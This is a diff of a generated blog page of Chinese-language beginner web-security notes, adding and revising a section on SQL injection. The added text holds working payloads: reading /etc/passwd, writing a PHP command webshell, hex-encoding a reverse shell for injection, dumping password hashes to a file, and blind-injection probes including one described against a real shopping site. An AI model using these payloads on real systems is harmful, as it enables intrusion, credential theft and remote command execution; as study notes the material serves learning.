@@ -78,7 +78,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/03/19/SQL-注入/" data-id="cjth476hj00006wuk7e6r8f7i" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/03/19/SQL-注入/" data-id="cjth8ct860000qgukro4ixjp9" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -99,10 +99,9 @@
 <h3 id="读写文件和下载数据库"><a href="#读写文件和下载数据库" class="headerlink" title="读写文件和下载数据库"></a>读写文件和下载数据库</h3><h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h4><p>‘union select null,LOAD_file(‘/etc/passwd’)#</p>
 <hr>
 <h4 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h4><blockquote>
-<p>‘union select null,”&lt;?php passthtu  $_GET[‘cmd’]);?&gt;”INTO DUMPFILE”/var/www/a.php”<br>可能会出发过滤机制<br>用16进制编码<br>kali实操拷贝一个反弹shell<br>cp /usr/share/webshell/php/ –&gt;reverse-shell.php/b.php<br>vi b.php 把ip改成目标ip 对b.php编码<br>cat b.php | xxd &lt;–(16进制编码) -ps<br>（会以固定长度编译，换行符mysql无法理解）用| tr -d ‘\n’<br>复制下编码内容注入到语句中去（0x编码内容）</p>
+<p>‘union select null,”&lt;?php passthtu  $_ GET[‘cmd’]);?&gt;”INTO DUMPFILE”/var/www/a.php<br>可能会出发过滤机制<br>用16进制编码<br>kali实操拷贝一个反弹shell<br>cp /usr/share/webshell/php/ →reverse-shell.php/b.php<br>vi b.php 把ip改成目标ip 对b.php编码<br>cat b.php | xxd &lt;–(16进制编码) -ps<br>（会以固定长度编译，换行符mysql无法理解）用| tr -d ‘\n’<br>复制下编码内容注入到语句中去（0x编码内容）<br>·Mysql账号<br>cat php-revers-shell.php|xxd -ps | tr -d ‘\n’(反弹shell)</p>
 </blockquote>
-<pre><code>·Mysql账号
-</code></pre><p>cat php-revers-shell.php|xxd -ps | tr -d ‘\n’(反弹shell)</p>
+<hr>
 <h4 id="保存下载数据库"><a href="#保存下载数据库" class="headerlink" title="保存下载数据库"></a>保存下载数据库</h4><p>union select null,(0x3a,password) from users INTO OUTFILE’/tmp/a.db’#(脱库到目标服务器的本地目录，在通过url下载)</p>
 <h4 id="一个思路：编写服务器代码"><a href="#一个思路：编写服务器代码" class="headerlink" title="一个思路：编写服务器代码"></a>一个思路：编写服务器代码</h4><p>举个例子：<br><img src="https://s2.ax1x.com/2019/03/19/AuGOAS.png" alt><br>（上传的webshell收到限制没什么用）<br>变换一个思路了解目标服务器结构等等，直接写一段代码执行命令<br>如上图可以创建一个表单添加一个用户<br>现在的加密破解难度极大，效率低，可以变通思路，直接更改数据库内容，或添加高权限管理员</p>
 <blockquote>
@@ -125,7 +124,14 @@
 <blockquote>
 <p>“\,’,”,\n,\r,\xla”<br>下面看一下high改动的代码<br><img src="https://s2.ax1x.com/2019/03/20/AKuJzV.png" alt="在添加一行删除\的代码"><br><img src="https://s2.ax1x.com/2019/03/20/AKuDiR.png" alt="检查输入的是否为数字拒绝其他输入"><br>一个数字检查就无法注入select语句了</p>
 </blockquote>
-<h3 id="sql-盲注"><a href="#sql-盲注" class="headerlink" title="sql 盲注"></a>sql 盲注</h3>
+<hr>
+<h3 id="sql-盲注"><a href="#sql-盲注" class="headerlink" title="sql 盲注"></a>sql 盲注</h3><p>不显示数据库内建的报错信息<br>    ·内建的报错信息帮助开发人员发现和修复问题<br>    ·报错信息提供关于系统的大量有用信息<br>当程序员隐藏了数据库内建报错信息，替换为通用的错误提示，sql注入将无法依据报错信息判断注入语句的执行结果即盲注</p>
+<p>思路：既然无法基于报错信息报错信息判断结果，基于逻辑真假的不同结果来判断<br>· 1’and 1=1#<br>· 1’and 1=2#<br>猜列名 ： 1’and table.user is not null#<br>猜库里其他表：1’and (select count() from table)&gt;0#<br>列对应关系 1’and users.user is not null#<br>猜字段内容：1’and user=’admin<br>           1’or user like ‘%a%<br>·猜账号对应密码：<br>         ·2’ or user=’admin’and password=’密码<br> ·burpsuit自动化猜解</p>
+<p>·打开脑洞，注入的方式多种多样<br>真实案例：某电商网站</p>
+<blockquote>
+<p><a href="http://1.1.1.1/goods.php?cnt&amp;goodsid=123" target="_blank" rel="noopener">http://1.1.1.1/goods.php?cnt&amp;goodsid=123</a><br>·and 1=1#   显示一包面巾纸<br>·and 1=2#   显示一包洗衣粉<br>工具未扫到漏洞，于是人工拼接了下列语句<br>                            ↓截取第一个字符<br>  · 1’and ORD(MID((version()),1,1))&amp;1&gt;0#<br> 得到ASCLL码↑ ↑从字符串截取 ↑查询版本信息<br>· CURRENT_USER()、DATABASE()<br>· MID(ColumName,Start[,Length])<br>·ORD(string)&amp;32 跟上的对应的字符的ascll码的32所在的位的值<br>1(128) 1(64) 1(32) 1(16) 1(8) 1(4) 1(2) 1(1)<br>依次查询就可以的到对应的ascll码进而得到所有信息.</p>
+</blockquote>
+
       
     </div><!-- .entry-content -->
 
@@ -161,7 +167,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/03/19/web安全入门第五天/" data-id="cjth476ix00066wukbagsfavm" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/03/19/web安全入门第五天/" data-id="cjth8ct8h0003qguky3r7tynf" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -249,7 +255,7 @@ mysql udf提权
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/03/19/web安全入门第4天/" data-id="cjth476ht00026wukzrtxzhi5" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/03/19/web安全入门第4天/" data-id="cjth8ct8i0004qgukoxl5sruc" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -312,7 +318,7 @@ mysql udf提权
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/03/19/web安全入门第三天/" data-id="cjth476hw00046wukkn9wnkt5" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/03/19/web安全入门第三天/" data-id="cjth8ct9m0006qgukcytcvdaj" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -453,7 +459,7 @@ mysql udf提权
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/03/18/web安全入门第二天/" data-id="cjth476hx00056wuk93qkb1jv" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/03/18/web安全入门第二天/" data-id="cjth8ct8g0002qgukgth8i3ii" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -504,7 +510,7 @@ mysql udf提权
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/03/18/web安全入门第一天/" data-id="cjth476hu00036wuk1vmrme82" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/03/18/web安全入门第一天/" data-id="cjth8ct8e0001qguk11ekz9vw" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -556,7 +562,7 @@ mysql udf提权
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/03/17/hello-world/" data-id="cjth476hr00016wuks0ft112t" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/03/17/hello-world/" data-id="cjth8ct980005qguk8dg29a9u" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
